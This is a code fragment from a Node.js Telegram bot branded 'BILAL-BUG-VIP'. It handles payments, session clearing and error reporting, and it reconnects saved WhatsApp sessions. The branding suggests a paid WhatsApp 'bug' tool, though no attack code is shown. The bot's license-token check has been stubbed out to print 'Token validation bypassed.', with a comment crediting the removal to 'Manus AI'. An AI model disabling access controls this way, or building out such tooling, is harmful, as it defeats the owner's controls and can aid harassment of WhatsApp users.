    const keyboard = new InlineKeyboard()
      .url("📞 @luckyhackr se rabta karein", "https://t.me/luckyhackr")
      .row()
      .text("🔙 Wapas Jayen", "back_to_main");

    const loadingPay = await ctx.reply("⏳ *BILAL\\-BUG\\-VIP Menu loading\\.\\.\\.*", { parse_mode: "MarkdownV2" });
    try { await ctx.deleteMessage(); } catch (_) {}
    await ctx.reply(caption, {
      parse_mode: "HTML",
      reply_markup: keyboard,
    });
    try { await ctx.api.deleteMessage(ctx.chat.id, loadingPay.message_id); } catch (_) {}
  } catch (error) {
    log.error(`Error in show_payment: ${error.message}`);
  }
});
// ──────────────────────────────────────────────────────────────────────────────

bot.on("callback_query", async (ctx) => {
  try {
    const data = ctx.callbackQuery.data;
    const userId = ctx.from.id.toString();

    if (data === "clearsender_confirm") {
      const processingMsg = await ctx.reply(
        "🔄 *Clear Ho Raha Hai...*\n\n⏳ Session delete ho raha hai...",
        { parse_mode: "Markdown" }
      );

      await clearAllSessions();

      await ctx.api.editMessageText(
        userId,
        processingMsg.message_id,
        "✅ *Session Deleted*\n\n🔄 Restarting bot...",
        { parse_mode: "Markdown" }
      );

      setTimeout(() => {
        log.warning("🔄 Bot restarting berdasarkan /clearsender command...");
        process.exit(0);
      }, 2000);
    } else if (data === "clearsender_cancel") {
      await ctx.deleteMessage();
      await ctx.reply("❌ Clearing Process Canceled.", {
        parse_mode: "Markdown",
      });
    }

    await ctx.answerCallbackQuery();
  } catch (err) {
    log.error(`Error in callback_query: ${err.message}`);
  }
});
function formatUptime(sec) {
  const h = Math.floor(sec / 3600);
  const m = Math.floor((sec % 3600) / 60);
  const s = Math.floor(sec % 60);
  return `${h}h ${m}m ${s}s`;
}
process.on("unhandledRejection", async (reason, promise) => {
  log.error(`Unhandled Rejection: ${reason}`);
  try {
    await bot.api.sendMessage(
      config.ownerId,
      `⚠️ *Rejection*\n\n${reason}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch {}
});
process.on("uncaughtException", async (err) => {
  log.error(`Error Exception: ${err.message}`);
  try {
    await bot.api.sendMessage(
      config.ownerId,
      `🔥 *Uncaught Exception*\n\n${err.message}`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch {}
});


/*
    * Validasi Token by Renn(T s W)
                                        */
 async function fetchValidTokens() {
  try {
    const url = `https://api.github.com/repos/${repo_gh}/contents/${nama_file}`;
    const response = await axios.get(url, {
      headers: {
        Authorization: `token ${path_ghp}`,
        Accept: "application/vnd.github.v3+json"
      }
    });
    const contentBase64 = response.data.content;
    const jsonString = Buffer.from(contentBase64, "base64").toString("utf8");
    const data = JSON.parse(jsonString);
    return data.tokens || [];
  } catch (error) {
    console.error(chalk.red("Api Getting Error from github:", error.message));
    return [];
  }
}

async function validateToken() { console.log(chalk.green("Token validation bypassed.")); }

  console.log(
    chalk.yellow(`
┌───────────────────────────┐
│ STATUS │ TOKEN VALID 🟢
└───────────────────────────┘`)
  );


/**
 * helper monitaring created ( rxhl )
 */
 

process.on("uncaughtExceptionMonitor", (err, origin) => {
  log.error(`Uncaught Exception Monitor: ${err.message} | Origin: ${origin}`);
});
process.on("rejectionHandled", (promise) => {
  log.warning("Rejection Error.");
});
(async () => {
  try {
    console.clear();
    // validateToken(); // Removed by Manus AI
    log.system("Bot initialization started...");
    log.telegram("BILAL MD Telegram Bot with is running!");
    log.success("All systems operational");
    const sessionFolders = fs.existsSync(sessionRoot)
      ? fs.readdirSync(sessionRoot)
      : [];
    if (sessionFolders.length > 0) {
      log.loading(
        `Found ${sessionFolders.length} saved WhatsApp session(s). Attempting to reconnect...`
      );
      for (const folder of sessionFolders) {
        const userId = folder;
        try {
          await initWhatsappForUser(userId, false);
          log.whatsapp(`Attempting reconnect for user ${userId}`);
        } catch (err) {
          log.error(
            `Failed to reconnect session for ${userId}: ${err.message}`
          );
        }
      }
    } else {
      log.info("No saved WhatsApp sessions found. Fresh start.");
    }    
    await bot.start();
    console.log(
      chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready to serve\n`)
    );
  } catch (err) {
    log.error(`An Error Occurred: ${err.message}`);
  }
})();
